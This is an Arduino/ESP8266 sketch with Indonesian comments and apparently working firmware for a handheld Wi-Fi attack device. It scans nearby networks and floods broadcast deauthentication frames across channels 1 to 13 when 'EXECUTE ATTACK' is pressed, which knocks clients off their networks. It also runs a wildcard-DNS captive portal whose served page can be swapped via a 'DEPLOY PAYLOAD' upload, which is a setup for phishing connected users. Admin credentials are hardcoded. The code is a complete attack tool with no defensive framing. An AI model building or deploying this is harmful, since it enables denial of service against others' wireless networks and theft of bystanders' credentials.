#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h> 
#include <Wire.h>
#include "SSD1306Wire.h" 

// Setup Layar 64x48 untuk OLED 0.66 (Alamat 0x3c, SDA=D2, SCL=D1)
SSD1306Wire display(0x3c, D2, D1, GEOMETRY_64_48);

// Panggil fungsi internal SDK 2.0.0 secara manual (Anti-Eror Stray #)
extern "C" {
  void wifi_set_channel(uint8 channel);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// Konfigurasi Admin
const char* admin_ssid = "GMpro86";
const char* admin_pass = "sangkur87";

ESP8266WebServer server(80);
DNSServer dnsServer;
File fsUploadFile;

bool massDeauthActive = false;
String scanResultsHTML = "READY TO SCAN...";

// Fungsi Update Layar OLED Mini
void drawStatus(String line1, String line2) {
  display.clear();
  display.setFont(ArialMT_Plain_10);
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawString(0, 0, "GM-PRO86");
  display.drawString(0, 15, line1);
  display.drawString(0, 30, line2);
  display.display();
}

// --- UI DASHBOARD ADMIN (PROFESSIONAL CONSOLE) ---
const char ADMIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body{background:#0a0a0a;color:#00ff00;font-family:monospace;margin:0;padding-bottom:80px}
  .hdr{border-bottom:1px solid #00ff00;padding:15px;text-align:center;font-weight:bold;background:#111}
  .card{background:#111;margin:10px;padding:15px;border:1px solid #333;border-left:4px solid #00ff00}
  .btn{border:1px solid #00ff00;background:0;color:#00ff00;padding:12px;width:100%;margin-top:10px;font-weight:bold;cursor:pointer}
  .btn-red{border-color:#ff0000;color:#ff0000}
  .nav{position:fixed;bottom:0;width:100%;background:#111;display:flex;border-top:1px solid #333}
  .item{flex:1;padding:20px;text-align:center;color:#444;font-size:12px}
  .active{color:#00ff00;background:#1a1a1a;border-top:2px solid #00ff00}
</style></head><body>
<div class="hdr">COMMANDER V8.6 PRO</div>
<div id="p1">
  <div class="card" style="border-left-color:#f00">
    <button class="btn btn-red" onclick="location.href='/mode?m=mass'">EXECUTE ATTACK</button>
    <button class="btn" onclick="location.href='/mode?m=off'" style="color:#fff;border-color:#fff">STOP ATTACK</button>
  </div>
  <div class="card">
    <button class="btn" onclick="location.href='/scan'">SCAN RADAR</button>
    <div style="margin-top:15px;font-size:10px;max-height:150px;overflow-y:auto">%WIFILIST%</div>
  </div>
</div>
<div id="p2" style="display:none">
  <div class="card">
    <form method="POST" action="/upload" enctype="multipart/form-data">
      <input type="file" name="f" accept=".html" style="color:#0f0"><br><br>
      <button class="btn" type="submit">DEPLOY PAYLOAD</button>
    </form>
  </div>
</div>
<div class="nav">
  <div id="t1" class="item active" onclick="show(1)">CONSOLE</div>
  <div id="t2" class="item" onclick="show(2)">FILES</div>
</div>
<script>
  function show(n){
    document.getElementById('p1').style.display=n==1?'block':'none';
    document.getElementById('p2').style.display=n==2?'block':'none';
    document.getElementById('t1').className='item '+(n==1?'active':'');
    document.getElementById('t2').className='item '+(n==2?'active':'');
  }
</script></body></html>
)rawliteral";

void setup() {
  SPIFFS.begin();
  pinMode(2, OUTPUT); 
  digitalWrite(2, HIGH); 

  display.init();
  display.flipScreenVertically();
  drawStatus("INIT...", "READY");

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/admin", [](){
    String s = ADMIN_HTML;
    s.replace("%WIFILIST%", scanResultsHTML);
    server.send(200, "text/html", s);
  });

  server.on("/scan", [](){
    int n = WiFi.scanNetworks();
    scanResultsHTML = "";
    for (int i = 0; i < n; ++i) {
      scanResultsHTML += "<div>[CH" + String(WiFi.channel(i)) + "] " + WiFi.SSID(i) + "</div>";
    }
    drawStatus("RADAR", "DONE");
    server.sendHeader("Location", "/admin");
    server.send(303);
  });

  server.on("/mode", [](){
    massDeauthActive = (server.arg("m") == "mass");
    server.sendHeader("Location", "/admin");
    server.send(303);
  });

  server.on("/upload", HTTP_POST, [](){ 
    server.send(200, "text/html", "SUCCESS. <a href='/admin'>BACK</a>"); 
  }, [](){
    HTTPUpload& upload = server.upload();
    if(upload.status == UPLOAD_FILE_START) fsUploadFile = SPIFFS.open("/index.html", "w");
    else if(upload.status == UPLOAD_FILE_WRITE) {
      if(fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize);
    }
    else if(upload.status == UPLOAD_FILE_END) {
      if(fsUploadFile) fsUploadFile.close();
    }
  });

  server.onNotFound([](){
    if(SPIFFS.exists("/index.html")){
      File f = SPIFFS.open("/index.html", "r");
      server.streamFile(f, "text/html");
      f.close();
    } else {
      server.send(200, "text/html", "System Loading...");
    }
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (massDeauthActive) {
    digitalWrite(2, !digitalRead(2)); 
    drawStatus("ATTACK", "ACTIVE");
    
    // Paket Deauth Broadcast
    uint8_t pkt[26] = {0xc0,0,0x3a,0x01, 0xff,0xff,0xff,0xff,0xff,0xff, 0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,1,0};
    
    for (int ch=1; ch<=13; ch++) {
      wifi_set_channel(ch);
      for (int i=0; i<15; i++) { 
        wifi_send_pkt_freedom(pkt, 26, 0); 
        delay(1); 
      }
      yield();
    }
  } else {
    digitalWrite(2, HIGH); 
    // Update display secara berkala agar tidak freeze
    static unsigned long lastUpdate = 0;
    if (millis() - lastUpdate > 2000) {
      drawStatus("IDLE", "WAITING");
      lastUpdate = millis();
    }
  }
}
